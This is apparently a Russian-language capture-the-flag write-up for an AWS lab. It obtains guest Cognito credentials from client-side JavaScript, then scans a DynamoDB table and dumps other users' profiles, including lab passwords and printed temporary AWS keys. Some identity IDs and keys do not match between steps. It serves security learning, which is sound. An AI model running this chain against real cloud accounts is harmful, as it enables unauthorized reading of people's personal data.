**Теги:** Cloud, AWS, Cognito, IAM Misconfiguration.
**Сложность:** Easy.

**Target:**

```text
http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
```

## 1. Reconnaissance

Начинаем с определения открытых портов и запущенных сервисов с помощью Nmap:

```bash
sudo nmap -sS -sV complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com
```

Получаем:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-03 05:41 EDT
Nmap scan report for complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com (52.216.24.51)
Host is up (0.015s latency).
Other addresses for complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com (not scanned): 16.15.254.204 16.15.255.205 16.15.223.3 16.15.207.136 16.15.229.232 52.216.53.21 54.231.160.189 64:ff9b::100f:e5e8 64:ff9b::34d8:1833 64:ff9b::100f:df03 64:ff9b::34d8:3515 64:ff9b::36e7:a0bd 64:ff9b::100f:ffcd 64:ff9b::100f:cf88 64:ff9b::100f:fecc
rDNS record for 52.216.24.51: s3-website-us-east-1.amazonaws.com
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE    VERSION
80/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
```

Из результатов видно, что веб-приложение размещено в AWS S3. Доступен HTTP на `80/tcp`, а сам hostname указывает на S3 Website Endpoint в регионе `us-east-1`.

---

## 2. Анализ JavaScript приложения

После просмотра исходного кода страницы обнаруживаем файл `app.js`.

В JavaScript находятся параметры AWS:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
```

Это важная находка: приложение использует **Amazon Cognito Identity Pool** для получения AWS-учётных данных, а затем работает с таблицей DynamoDB `complimentary-GuestWellnessProfiles`.

Таким образом, из клиентского JavaScript были получены:

* Cognito Identity Pool:
  `us-east-1:836c0949-292d-485b-b532-52d5ca7bb688`
* AWS Region:
  `us-east-1`
* DynamoDB table:
  `complimentary-GuestWellnessProfiles`

---

## 3. Поиск дополнительных директорий

Проверяем веб-сервер с помощью Gobuster:

```bash
gobuster dir -u complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com -w ~/HH101/seclists/Discovery/Web-Content/big.txt -t2 --timeout 30s
```

Конфигурация сканирования:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com
[+] Method:                  GET
[+] Threads:                 2
[+] Wordlist:                /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 30s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
```

Во время сканирования происходят ошибки DNS/network timeout:

```text
Progress: 11400 / 20482 (55.66%)[ERROR] Get "http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/maquettes": dial tcp: lookup complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com on 10.0.2.3:53: read udp 10.0.2.15:59189->10.0.2.3:53: i/o timeout
```

Также обнаруживается:

```text
/soap                 (Status: 200) [Size: 0
```

Однако `/soap` не отвечает на запросы в браузере.

Таким образом, дальнейший интерес представляет не найденная директория, а обнаруженные ранее AWS-конфигурационные данные из `app.js`.

---

# 4. Получение Cognito Identity через aws-cli

Имея `IDENTITY_POOL_ID`, обращаемся к Amazon Cognito и запрашиваем Identity ID:

```bash
aws cognito-identity get-id \
  --region us-east-1 \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
```

Ответ:

```json
{
    "IdentityId": "us-east-1:4d571309-b08d-c56a-c543-30e257953228"
}
```

На этом этапе Cognito выдаёт идентификатор временной identity:

```text
us-east-1:4d571309-b08d-c56a-c543-30e257953228
```

То есть приложение использует Cognito Identity Pool, через который анонимный/гостевой пользователь потенциально может получить временные AWS credentials.

---

# 5. Получение временных AWS credentials

Следующим шагом запрашиваем временные credentials для Cognito Identity:

```bash
aws cognito-identity get-credentials-for-identity \
  --region us-east-1 \
  --identity-id "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
```

AWS возвращает:

```json
{
    "IdentityId": "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13",
    "Credentials": {
        "AccessKeyId": "ASIAU2VYTBGYCFTPQKUC",
        "SecretKey": "XglN9y9H6oL0LBEVehV6fat5HVUhip/4Fdljeo/E",
        "SessionToken": "...",
        "Expiration": "2026-08-03T07:51:01-04:00"
    }
}
```

В полном выводе AWS также присутствовал большой `SessionToken`.

Полученные credentials являются **временными AWS credentials**, которые позволяют выполнять действия в AWS от имени той Cognito Identity, которой они были выданы.

Время действия credentials ограничено:

```text
Expiration: 2026-08-03T07:51:01-04:00
```

---

# 6. Экспорт AWS credentials

Чтобы AWS CLI автоматически использовал полученные временные credentials, мы экспортируем их в переменные окружения:

```bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYKP67ULN3"
export AWS_SECRET_ACCESS_KEY="s20bKrmdV3va1tC8TQUoJ1lrc11yqAXRmXwkzqMi"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjELv..."
export AWS_DEFAULT_REGION="us-east-1"
```

После этого AWS CLI будет использовать эти значения для последующих запросов.

Также устанавливается регион по умолчанию:

```text
AWS_DEFAULT_REGION=us-east-1
```

---

# 7. Проверка AWS Identity

После установки credentials проверяем, от имени какой AWS identity выполняются запросы:

```bash
aws sts get-caller-identity
```

Команда используется для проверки текущего AWS-контекста и подтверждения того, что временные credentials действительно работают.

В логе непосредственно вывод этой команды отсутствует.

---

# 8. Доступ к DynamoDB

Ранее в `app.js` мы обнаружили название таблицы:

```text
complimentary-GuestWellnessProfiles
```

Теперь используем полученные AWS credentials для обращения к DynamoDB:

```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
```

Запрос `scan` позволяет получить записи из таблицы DynamoDB.

В результате обнаруживаются профили пользователей.

---

# 9. Первый профиль

В таблице находится профиль:

```text
password: digitaldetox2026
location: 25.2055,55.2733
notes: Booked the quiet room for his "digital detox." Checked email twice since writing that.
guest_id: guest-vibe
email: vibe@hackerholidays.thm
phone: +1-555-0193
name: Vibe (Move Fast & Break Things)
```

Таким образом, гостевая AWS identity получила возможность читать данные из таблицы с профилями пользователей.

---

# 10. Второй профиль

Следующая запись содержит:

```text
password: sunkissed88
location: 25.2048,55.2708
notes: Posted 47 times in three days. Wants everything tagged #ByteLotus for the algorithm.
guest_id: guest-lambo
email: lambo@hackerholidays.thm
phone: +1-555-0142
name: Lambo (@0xMia)
```

Это подтверждает, что доступ распространяется не только на собственный профиль гостя, но и на другие записи таблицы.

---

# 11. Поиск флага

В следующей записи находится наиболее важная информация:

```text
password: escalation_only
location: 25.2048,55.2708
notes: If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}
guest_id: guest-vip-042
email: vip042@hackerholidays.thm
phone: +1-555-0100
name: Guest VIP-042
```

В поле `notes` непосредственно указано, что роль гостя в wellness-приложении может читать **все профили**, а не только собственный.

Здесь же находится флаг:

```text
THM{fr33_app_fr33_d4t4!}
```


## Что произошло

Цепочка атаки выглядит следующим образом:

1. Nmap показал, что приложение размещено на AWS S3.
2. В `app.js` были найдены `IDENTITY_POOL_ID`, регион AWS и название DynamoDB-таблицы.
3. Через `aws cognito-identity get-id` был получен Cognito Identity ID.
4. Через `get-credentials-for-identity` были получены временные AWS credentials.
5. Credentials были установлены в переменные окружения.
6. `aws sts get-caller-identity` использовался для проверки текущей AWS identity.
7. Полученные права позволили выполнить `DynamoDB Scan`.
8. `Scan` вернул содержимое таблицы `complimentary-GuestWellnessProfiles`, включая чужие профили.
9. В поле `notes` одного из профилей был найден флаг:

```text
THM{fr33_app_fr33_d4t4!}
```

Основная проблема комнаты — **избыточные права гостевой Cognito identity**, позволившие читать все профили DynamoDB вместо ограничения доступа данными конкретного пользователя.
